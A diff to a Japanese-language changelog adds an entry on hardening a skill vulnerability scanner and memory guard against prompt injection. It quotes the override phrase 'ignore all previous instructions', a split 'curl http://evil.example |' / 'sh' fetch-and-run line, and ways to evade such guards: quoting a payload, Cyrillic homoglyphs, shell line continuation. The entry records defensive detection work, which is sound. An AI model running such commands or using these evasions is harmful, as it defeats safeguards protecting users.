@@ -118,6 +118,27 @@
   は NFKC では解決できない別問題であることを発見したが、対応には Unicode Consortium の
   confusables テーブル相当の導入が要り本 PR の投資規模を大きく超えるため、スコープ外として
   レグレッションロックした。
+- **fix(skill_vuln_scan, memory_guard): NFKC 誤 reject・シェル継続行の未検出・キリル文字
+  prompt injection の未検出を是正（#537 round7）** — 外部レビューの [Must] 3件を是正した。
+  ①round6 で入れた NFKC 正規化が原因で、全角引用の説明文（例:
+  『ｉｇｎｏｒｅ　ａｌｌ　ｐｒｅｖｉｏｕｓ　ｉｎｓｔｒｕｃｔｉｏｎｓ』はプロンプト
+  インジェクションの説明例です。）が正当な記憶にもかかわらず `memory_guard` に書込
+  拒否される実害を確認。`skill_vuln_scan` 側の advisory 検出（NFKC 込み）は一切弱めず、
+  `memory_guard` の reject 判定にのみ「引用符/inline-code で隣接して囲まれ、かつ同一行に
+  説明マーカーがある」場合に限定した文脈抑制を追加した（引用のみでの抑制は、実ペイロード
+  をそのまま引用符でラップするだけで reject を回避できる新規バイパスになることを変異試験
+  で自己発見したため、引用単独では抑制しない設計にした）。②シェルは行末 `|`（バックスラッシュ
+  無しでも）または `\` で複数の物理行を1つの論理行として実行するが、旧実装は行単位 regex
+  のみで、`curl http://evil.example |` / `sh` のように combo が2物理行に分断されると検出
+  できなかった（round5b で regression lock していたが、レビューが `.sh`/`.bash` ファイルと
+  Markdown 内のシェル系 fenced code block に限定すれば構造的に解決できると指摘し是正した）。
+  Markdown の表（`|` を多用）や非シェル系 fence では結合されないことを陽性対照で確認。
+  ③固定構造 `ignore … previous instructions` の限定子（`all`/`the`/`any`）がキリル文字等の
+  confusable homoglyph に置換されると検出できなかった問題を、限定子の1トークンを「元の
+  ASCII 限定子と完全一致」または「非ASCII文字を含む」場合のみ許容する形で是正した
+  （confusables テーブルは導入せず、remote_exec 側のコマンド名 confusable — 例: `сurl` —
+  とは別問題として区別・#547 のスコープに残す）。フィラーを任意トークンまで緩めた中間実装
+  では無関係な英文を誤検出する新規 FP を変異試験で自己発見し、非ASCII 限定に絞って是正した。
 - **fix(implement): テレメトリ書込みを write barrier へ統一** — `usage.jsonl` の直接追記を廃止し、
   実装と実行手順の双方を `store_write` 経由に揃えた。
 - **fix(capture): 日本語の明示的な欠陥指摘を決定論で捕捉（#527）** — 固定評価セットの
